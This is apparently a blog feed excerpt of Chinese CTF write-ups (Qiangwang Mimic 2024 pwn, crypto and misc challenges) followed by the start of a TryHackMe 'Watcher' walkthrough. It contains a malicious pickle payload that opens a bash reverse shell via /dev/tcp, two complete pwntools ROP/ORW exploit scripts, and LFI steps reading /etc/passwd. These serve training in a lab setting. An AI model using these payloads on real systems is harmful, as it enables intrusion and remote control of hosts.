class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dddd.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Type of &#x27;data&#x27;: <span class="subst">&#123;<span class="built_in">type</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Module of &#x27;data&#x27;: <span class="subst">&#123;data.__module__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(data, <span class="string">&#x27;__module__&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传即可</p><p>PS:这shell弹的太慢了,我还以为环境死了差点关了….</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094112459-1685459773.png" alt="image-20241019162930878"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>题目描述</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimic is a keyword.</span><br><span class="line"><span class="number">0</span>b<span class="number">050</span><span class="keyword">c</span><span class="number">0e180</span>e<span class="number">585</span>f<span class="number">5</span><span class="keyword">c</span><span class="number">52555</span><span class="keyword">c</span><span class="number">5544545</span><span class="keyword">c</span><span class="number">0</span>a<span class="number">0</span>f<span class="number">44535</span>f<span class="number">0</span>f<span class="number">5e445658595844050</span>f<span class="number">5</span>d<span class="number">0</span>f<span class="number">0</span>f<span class="number">55590</span><span class="keyword">c</span><span class="number">555e5</span>a<span class="number">0914</span></span><br></pre></td></tr></table></figure><p>直接给gpt，秒了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094135992-1445668991.png" alt="image-20241019163249407"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094156218-2020019155.png" alt="image-20241019163313547"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ezflag"><a href="#ezflag" class="headerlink" title="ezflag"></a>ezflag</h2><p>解压压缩包有个流量包,拿工具跑出来一个压缩包</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094229732-112185337.png" alt="image-20241019163729644"></p><p>解压后有个<code>flag.zip</code>，但是解压不出来，拿file看一下发现是一个png</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094425840-1389928001.png" alt="image-20241019163915023"></p><p>之后改一下后缀即可得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094352731-1655859914.png" alt="image-20241019163906271"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin revenge"></a>signin revenge</h2><h3 id="题目libc环境"><a href="#题目libc环境" class="headerlink" title="题目libc环境"></a>题目libc环境</h3><blockquote><p>那道题目的时候，发现题目是直接跑不起来的。开始以为是沙箱的问题，还是太菜了。其实更换题目libc环境的问题</p><p>这里跟换一下题目的libc环境，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed  libc.so.6 ./libc.so.6 vuln</span><br><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2  vuln</span><br></pre></td></tr></table></figure><p>ldd vuln查看一下更换是否成功。</p><p>然后就可以正常运行了。</p><p>踩坑点：注意要把给定的libc文件进行授权。并且要在管理员模式下授权。</p><p>这里注意不换也行，正常打远程应该不影响做题，但是复现跑本地就会遇到麻烦了。但是如果是你是kali的话。把他俩放在同一文件下kali会自行匹配ld文件和libc文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ ldd vuln</span><br><span class="line">linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff6fb85000</span>)</span><br><span class="line">./libc.so<span class="number">.6</span> (<span class="number">0x00007fce115dc000</span>)    <span class="comment">//---------------------------------------------&gt;&gt;&gt;ld文件</span></span><br><span class="line">./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fce117d0000</span>)<span class="comment">//-------&gt;&gt;&gt;libc文件</span></span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/<span class="number">11111</span>$ </span><br></pre></td></tr></table></figure></blockquote><p>先日常检查一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/2222/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ </span><br></pre></td></tr></table></figure><p>正常的NX和got表可写</p><p>丢进ida里面看看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lets move and pwn!&quot;</span>);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去可以明显的看见一个沙箱函数和我们所要纯在漏洞的read函数</p><p>简单看一下沙箱函数</p><p>这里我问了一下gpt，其实大概我的理解就是提醒我们使用ORW</p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>首先通过<code>open函数</code>向<code>bss段上</code>中写入<code>b&#39;./flag\x00\x00&#39;</code>，并将<code>b&#39;./flag\x00\x00&#39;</code>作为<code>open函数</code>的参数，构造<code>open(b&#39;./flag\x00\x00&#39;)</code>用来打开当前目录名为flag的文件，其中0表示只读方式打开。然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 <code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端。</p><p>寄存器的偏移查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so.6 --only  <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p>ROP链就是一个正常的泄露libc基址链</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span>*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span></span><br><span class="line"><span class="function">libc</span>=<span class="built_in">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=<span class="built_in">ELF</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;pwn-d929761f60.challenge.xctf.org.cn&quot;</span>, 9999, ssl=True)</span></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000401393</span></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+<span class="built_in">p64</span>(rdi)+<span class="built_in">p64</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(<span class="number">0x4012F0</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(read)+<span class="built_in">p64</span>(<span class="number">0x4012EE</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">orw  = b<span class="number">&#x27;</span>/flag\x00\x00\x00<span class="number">&#x27;</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(bss)  #/flag的字符串位置，要改</span><br><span class="line">orw += <span class="built_in">p64</span>(rsi) + <span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(open_)</span><br><span class="line"></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">3</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(read)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">1</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="meta">#pr(hex(len(orw)))</span></span><br><span class="line">p.<span class="built_in">send</span>(orw)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>日常检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3f7000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ </span><br></pre></td></tr></table></figure><p>两道题几乎一样，但是这道题多了几个绕过和伪随机数绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-ecdfbe9bc0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xun</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Input the authentication code:&#x27;</span>)</span><br><span class="line">       <span class="comment">#payload = str((elf1.rand()%100) + 1)</span></span><br><span class="line">       <span class="comment">#p.send(payload)</span></span><br><span class="line">        p.send(p64(elf1.rand()%<span class="number">100</span>+<span class="number">1</span>))</span><br><span class="line">       </span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">     </span><br><span class="line">       </span><br><span class="line">rdi=<span class="number">0x0000000000401893</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x00000000040177B</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rl(&quot;lets move and pwn!&quot;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(<span class="number">0x0004013EE</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">orw  = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">orw += p64(rdi) + p64(bss)  <span class="comment">#/flag的字符串位置，要改</span></span><br><span class="line">orw += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(len(orw)))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(orw)))</span><br><span class="line">p.send(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">强网拟态 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>THM-Watcher</title>
    <link href="https://ya1orin.github.io/posts/837dcb87.html"/>
    <id>https://ya1orin.github.io/posts/837dcb87.html</id>
    <published>2024-10-18T11:32:56.000Z</published>
    <updated>2024-11-13T05:19:41.575Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.76.81</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132502836-1887610598.png" alt="image-20241021132444064"></p><p>发现开放21，22，80端口</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>尝试一下匿名登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132601829-412050595.png" alt="image-20241021132544221"></p><p>匿名登陆失败</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132647834-1011735877.png" alt="image-20241021132630028"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132809242-1024503247.png" alt="image-20241021132751518"></p><p>随便点击后发现在url处疑似存在文件包含，尝试利用一下</p><p><code>/post.php?post=/etc/passwd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132848048-1949569944.png" alt="image-20241021132830423"></p><p>此处确实存在文件包含</p><p>再扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.76.81/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133255264-514546742.png" alt="image-20241021133237741"></p><ul><li><code>robots.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133341367-1636037732.png" alt="image-20241021133323903"></p><p>找到俩文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133429703-900456467.png" alt="image-20241021133412280"></p><p>其中一个是flag1</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133523610-110842426.png" alt="image-20241021133506063"></p><p>另一个无法访问，但是可以用之前发现的文件包含读取文件</p><p><code>/post.php?post=secret_file_do_not_read.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133606595-1706470773.png" alt="image-20241021133549160"></p><p>发现另一重要目录<code>/home/ftpuser/ftp/files</code>，同时最后面像是一组用户名密码<code>ftpuser:givemefiles777</code>，再次尝试登录ftp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp ftpuser@10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134015974-2036326351.png" alt="image-20241021133958383"></p><p>登陆成功，并找到flag2</p><p>同时files目录就是之前通过任意文件读取找到的目录 </p><h1 id="获得初始访问权限"><a href="#获得初始访问权限" class="headerlink" title="获得初始访问权限"></a>获得初始访问权限</h1><p>我们可以尝试一下，通过ftp上传的文件，我们知道其绝对路径，就可以通过文件读取进行利用</p><p>先简单尝试一下，准备个php文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134728595-1142287777.png" 